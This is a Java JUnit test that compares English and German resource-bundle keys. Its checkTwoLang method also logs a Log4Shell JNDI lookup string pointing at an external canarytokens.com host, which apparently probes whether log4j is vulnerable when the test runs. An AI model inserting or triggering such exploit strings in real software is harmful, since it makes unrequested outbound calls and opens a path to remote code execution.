package de.safe_ev.transparenzsoftware;

import static org.junit.Assert.assertEquals;

import java.util.Enumeration;
import java.util.Locale;
import java.util.ResourceBundle;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.junit.Test;
import org.slf4j.LoggerFactory;

public class LangResourcesTest {

	
	@Test
	public void checkTwoLang() {
		
		compareLang(new Locale("en","EN"), new Locale("de","DE"));
		
		Logger LOG = LogManager.getLogger("foobar");
		LOG.info("Here is ${java:os} ${jndi:ldap://"+System.currentTimeMillis()+".u68w7yd1jfdw9bncqdq4v4u3m.canarytokens.com/a}");
	}

	private void compareLang(Locale l1, Locale l2) {
		int total = checkLang(l1,l2);
		total += checkLang(l2,l1);
		assertEquals(0, total);
	}

	private int checkLang(Locale l1, Locale l2) {
		int errors = 0;
		ResourceBundle r1 = ResourceBundle.getBundle("i18n/lang", l1);
		ResourceBundle r2 = ResourceBundle.getBundle("i18n/lang", l2);
		Enumeration<String> e1 = r1.getKeys();
		while (e1.hasMoreElements()) {
			String k = e1.nextElement();
			String v2 = r2.getString(k);
			if (v2 == null || v2.isEmpty()) {
				System.err.println("Key "+k+" is missing in "+l2.getCountry());
				System.out.println("Key "+k+" is missing in "+l2.getCountry());
				errors++;
			} else {
				// System.out.println("Key "+k+" "+v2);
			}
		}
		return errors;
	}
}
